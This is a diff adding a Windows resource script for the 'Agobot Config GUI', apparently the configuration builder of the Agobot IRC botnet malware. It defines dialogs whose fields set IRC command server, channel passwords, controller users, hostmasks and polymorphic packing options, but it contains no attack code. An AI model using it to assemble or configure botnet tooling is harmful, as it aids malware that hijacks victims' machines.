@@ -1,0 +1,304 @@
+//Microsoft Developer Studio generated resource script.
+//
+#include "resource.h"
+
+#define APSTUDIO_READONLY_SYMBOLS
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 2 resource.
+//
+#include "afxres.h"
+
+/////////////////////////////////////////////////////////////////////////////
+#undef APSTUDIO_READONLY_SYMBOLS
+
+/////////////////////////////////////////////////////////////////////////////
+// German (Germany) resources
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_DEU)
+#ifdef _WIN32
+LANGUAGE LANG_GERMAN, SUBLANG_GERMAN
+#pragma code_page(1252)
+#endif //_WIN32
+
+#ifdef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// TEXTINCLUDE
+//
+
+1 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "resource.h\0"
+END
+
+2 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "#include ""afxres.h""\r\n"
+    "\0"
+END
+
+3 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "\r\n"
+    "\0"
+END
+
+#endif    // APSTUDIO_INVOKED
+
+#endif    // German (Germany) resources
+/////////////////////////////////////////////////////////////////////////////
+
+
+/////////////////////////////////////////////////////////////////////////////
+// English (U.S.) resources
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
+#ifdef _WIN32
+LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
+#pragma code_page(1252)
+#endif //_WIN32
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// DESIGNINFO
+//
+
+#ifdef APSTUDIO_INVOKED
+GUIDELINES DESIGNINFO DISCARDABLE 
+BEGIN
+    IDD_ABOUTBOX, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 228
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 48
+    END
+
+    IDD_CONFIGGUI_DIALOG, DIALOG
+    BEGIN
+        VERTGUIDE, 8
+        VERTGUIDE, 53
+        VERTGUIDE, 71
+        VERTGUIDE, 79
+        VERTGUIDE, 91
+        VERTGUIDE, 132
+        VERTGUIDE, 146
+        VERTGUIDE, 195
+        VERTGUIDE, 206
+        VERTGUIDE, 212
+        VERTGUIDE, 217
+        VERTGUIDE, 256
+        VERTGUIDE, 261
+        VERTGUIDE, 271
+        VERTGUIDE, 311
+        VERTGUIDE, 317
+        VERTGUIDE, 327
+        VERTGUIDE, 381
+        VERTGUIDE, 397
+        VERTGUIDE, 499
+        TOPMARGIN, 5
+        BOTTOMMARGIN, 321
+        HORZGUIDE, 20
+        HORZGUIDE, 25
+        HORZGUIDE, 59
+        HORZGUIDE, 123
+        HORZGUIDE, 130
+        HORZGUIDE, 137
+        HORZGUIDE, 144
+        HORZGUIDE, 150
+        HORZGUIDE, 218
+        HORZGUIDE, 228
+        HORZGUIDE, 243
+        HORZGUIDE, 246
+        HORZGUIDE, 260
+        HORZGUIDE, 264
+        HORZGUIDE, 277
+        HORZGUIDE, 280
+        HORZGUIDE, 294
+        HORZGUIDE, 297
+        HORZGUIDE, 310
+        HORZGUIDE, 316
+    END
+END
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Icon
+//
+
+// Icon with lowest ID value placed first to ensure application icon
+// remains consistent on all systems.
+IDR_MAINFRAME           ICON    DISCARDABLE     "res\\configgui.ico"
+IDI_STRING              ICON    DISCARDABLE     "res\\string.ico"
+IDI_BOOL                ICON    DISCARDABLE     "res\\bool.ico"
+IDI_CHAR                ICON    DISCARDABLE     "res\\char.ico"
+IDI_INT                 ICON    DISCARDABLE     "res\\int.ico"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Dialog
+//
+
+IDD_ABOUTBOX DIALOG DISCARDABLE  0, 0, 235, 55
+STYLE DS_MODALFRAME | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "About Agobot Config GUI"
+FONT 8, "MS Sans Serif"
+BEGIN
+    ICON            IDR_MAINFRAME,IDC_STATIC,11,17,20,20
+    LTEXT           "Agobot Config GUI Version 0.1",IDC_STATIC,40,10,119,8,
+                    SS_NOPREFIX
+    LTEXT           "Copyright (C) 2004 by Ago",IDC_STATIC,40,25,119,8
+    DEFPUSHBUTTON   "OK",IDOK,178,7,50,14,WS_GROUP
+END
+
+IDD_CONFIGGUI_DIALOG DIALOGEX 0, 0, 507, 324
+STYLE DS_MODALFRAME | WS_POPUP | WS_VISIBLE | WS_CAPTION | WS_SYSMENU
+EXSTYLE WS_EX_APPWINDOW
+CAPTION "Agobot Config GUI"
+FONT 8, "MS Sans Serif"
+BEGIN
+    LISTBOX         IDC_CONFIG_LIST,8,25,248,98,LBS_SORT | 
+                    LBS_NOINTEGRALHEIGHT | WS_VSCROLL | WS_TABSTOP
+    EDITTEXT        IDC_VALUE_STRING,311,68,182,14,ES_AUTOHSCROLL | NOT 
+                    WS_VISIBLE
+    EDITTEXT        IDC_VALUE_INT,311,68,182,14,ES_AUTOHSCROLL | ES_NUMBER | 
+                    NOT WS_VISIBLE
+    EDITTEXT        IDC_VALUE_CHAR,311,68,19,14,ES_AUTOHSCROLL | NOT 
+                    WS_VISIBLE
+    LTEXT           "Description",IDC_DESCRIPTION,279,30,220,15,
+                    SS_CENTERIMAGE
+    CONTROL         "True",IDC_VALUE_BOOL,"Button",BS_AUTOCHECKBOX | NOT 
+                    WS_VISIBLE | WS_TABSTOP,311,68,85,14
+    LTEXT           "Nick Prefix:",IDC_PREFIX_TEXT,7,297,38,14,
+                    SS_CENTERIMAGE
+    EDITTEXT        IDC_NICKPREFIX,91,297,165,14,ES_AUTOHSCROLL
+    LISTBOX         IDC_SERVER_LIST,8,150,248,68,LBS_SORT | 
+                    LBS_NOINTEGRALHEIGHT | WS_VSCROLL | WS_TABSTOP
+    CONTROL         "Root Server",IDC_ROOTSERVER,"Button",BS_AUTOCHECKBOX | 
+                    WS_TABSTOP,141,130,54,14
+    CONTROL         "Use SSL",IDC_USESSL,"Button",BS_AUTOCHECKBOX | 
+                    WS_TABSTOP,202,130,54,14
+    PUSHBUTTON      "Load from",IDLOADFROM,146,5,49,15
+    PUSHBUTTON      "Save to",IDSAVETO,206,5,50,15
+    PUSHBUTTON      "Add Server",IDADDSERVER,7,130,45,14
+    PUSHBUTTON      "Delete Server",IDDELSERVER,71,130,50,14
+    DEFPUSHBUTTON   "Generate Config",IDOK,8,5,63,15
+    PUSHBUTTON      "Cancel",IDCANCEL,82,5,50,15
+    LISTBOX         IDC_USER_LIST,271,150,228,68,LBS_SORT | 
+                    LBS_NOINTEGRALHEIGHT | WS_VSCROLL | WS_TABSTOP
+    PUSHBUTTON      "Add User",IDADDUSER,271,130,50,14
+    PUSHBUTTON      "Delete User",IDDELUSER,331,130,50,14
+    CTEXT           "In Soviet Russia, Agobot configures you!",IDC_QUOTE,271,
+                    92,228,23,SS_CENTERIMAGE
+    LTEXT           "Username:",IDC_USERNAME_TEXT,271,228,46,17,
+                    SS_CENTERIMAGE
+    EDITTEXT        IDC_USERNAME,327,228,172,17,ES_AUTOHSCROLL
+    LTEXT           "Password:",IDC_PASSWORD_TEXT,271,249,46,13,
+                    SS_CENTERIMAGE
+    EDITTEXT        IDC_PASSWORD,327,249,172,13,ES_AUTOHSCROLL
+    LTEXT           "Hostmask:",IDC_HOSTMASK_TEXT,271,265,46,14,
+                    SS_CENTERIMAGE
+    EDITTEXT        IDC_HOSTMASK,327,265,172,14,ES_AUTOHSCROLL
+    LTEXT           "Identdmask:",IDC_IDENTDMASK_TEXT,271,282,46,13,
+                    SS_CENTERIMAGE
+    EDITTEXT        IDC_IDENTDMASK,327,282,172,13,ES_AUTOHSCROLL
+    LTEXT           "Server Password:",IDC_SERVPASS_TEXT,7,246,62,14,
+                    SS_CENTERIMAGE
+    EDITTEXT        IDC_SERVPASS,91,246,165,14,ES_AUTOHSCROLL
+    LTEXT           "Server:",IDC_SERVER_TEXT,7,228,62,15,SS_CENTERIMAGE
+    EDITTEXT        IDC_SERVER,91,228,121,15,ES_AUTOHSCROLL
+    LTEXT           "Channel Password:",IDC_CHANPASS_TEXT,7,280,62,14,
+                    SS_CENTERIMAGE
+    EDITTEXT        IDC_CHANPASS,91,280,165,14,ES_AUTOHSCROLL
+    LTEXT           "Main Channel:",IDC_MAINCHAN_TEXT,7,263,62,15,
+                    SS_CENTERIMAGE
+    EDITTEXT        IDC_MAINCHAN,91,263,165,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_SERVPORT,217,228,39,15,ES_AUTOHSCROLL
+    LTEXT           "Polymorph Section Name:",IDC_POLY_TEXT,271,302,80,14,
+                    SS_CENTERIMAGE
+    EDITTEXT        IDC_POLY_SECNAME,364,302,52,14,ES_AUTOHSCROLL
+    GROUPBOX        "Properties",IDC_STATIC,271,20,232,33
+    GROUPBOX        "Value",IDC_STATIC,271,59,228,28
+    LTEXT           "Key Length:",IDC_KEYLEN_TEXT,419,303,43,14,
+                    SS_CENTERIMAGE
+    EDITTEXT        IDC_KEY_LEN,473,302,26,14,ES_AUTOHSCROLL | ES_NUMBER
+    PUSHBUTTON      "Edit Script",IDEDITSCR,271,6,50,14
+    PUSHBUTTON      "FAQ",IDFAQ,331,5,50,15
+    PUSHBUTTON      "Cmd Ref",IDCMDREF,391,5,50,15
+END
+
+
+#ifndef _MAC
+/////////////////////////////////////////////////////////////////////////////
+//
+// Version
+//
+
+VS_VERSION_INFO VERSIONINFO
+ FILEVERSION 1,0,0,1
+ PRODUCTVERSION 1,0,0,1
+ FILEFLAGSMASK 0x3fL
+#ifdef _DEBUG
+ FILEFLAGS 0x1L
+#else
+ FILEFLAGS 0x0L
+#endif
+ FILEOS 0x40004L
+ FILETYPE 0x1L
+ FILESUBTYPE 0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904b0"
+        BEGIN
+            VALUE "Comments", "\0"
+            VALUE "CompanyName", "\0"
+            VALUE "FileDescription", "Agobot Config GUI\0"
+            VALUE "FileVersion", "1, 0, 0, 1\0"
+            VALUE "InternalName", "Agobot Config GUI\0"
+            VALUE "LegalCopyright", "Copyright © 2004 by Ago\0"
+            VALUE "LegalTrademarks", "\0"
+            VALUE "OriginalFilename", "configgui.exe\0"
+            VALUE "PrivateBuild", "\0"
+            VALUE "ProductName", "Agobot Config GUI\0"
+            VALUE "ProductVersion", "1, 0, 0, 1\0"
+            VALUE "SpecialBuild", "\0"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x409, 1200
+    END
+END
+
+#endif    // !_MAC
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// String Table
+//
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    IDM_ABOUTBOX            "&About Agobot Config GUI..."
+END
+
+#endif    // English (U.S.) resources
+/////////////////////////////////////////////////////////////////////////////
+
+
+
+#ifndef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 3 resource.
+//
+
+
+/////////////////////////////////////////////////////////////////////////////
+#endif    // not APSTUDIO_INVOKED
+
